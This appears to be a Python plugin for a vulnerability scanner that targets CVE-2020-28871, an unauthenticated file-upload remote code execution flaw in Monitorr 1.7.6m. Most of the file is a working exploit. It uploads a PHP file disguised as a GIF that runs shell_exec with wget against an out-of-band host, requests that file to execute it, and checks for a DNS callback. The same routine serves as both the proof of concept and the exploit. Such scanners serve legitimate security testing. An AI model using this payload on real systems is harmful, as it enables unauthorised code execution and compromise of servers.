import requests
import random
import string
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Monitorr 1.7.6m - Unauthenticated Remote Code Execution''',
        "description": '''This template detects a remote code execution (RCE) vulnerability in Monitorr 1.7.6m. Improper input validation and lack of authorization leads to arbitrary file uploads in the web application. An unauthorized attacker with web access to could upload and execute a specially crafted file, leading to remote code execution within the Monitorr.''',
        "severity": "critical",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2020-28871", 
            "https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/", 
            "https://www.exploit-db.com/exploits/48980"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2020-28871",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "monitorr", "rce", "oast"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    randstr = gen_randstr(10)
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/assets/php/upload.php"""
        method = "POST"
        data = """-----------------------------31046105003900160576454225745
Content-Disposition: form-data; name="fileToUpload"; filename="{randstr}.php"
Content-Type: image/gif

GIF89a213213123<?php shell_exec("wget -c http://{oob_domain}");

-----------------------------31046105003900160576454225745--""".format(oob_domain=oob_domain, randstr=randstr)
        headers = {'Accept-Encoding': 'gzip, deflate', 'Accept': 'text/plain, */*; q=0.01', 'Connection': 'close', 'Accept-Language': 'en-US,en;q=0.5', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'multipart/form-data; boundary=---------------------------31046105003900160576454225745', 'Origin': 'http://{{Hostname}}', 'Referer': 'http://{{Hostname}}'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/assets/data/usrimg/{}.php""".format(randstr.lower())
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url

def gen_randstr(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))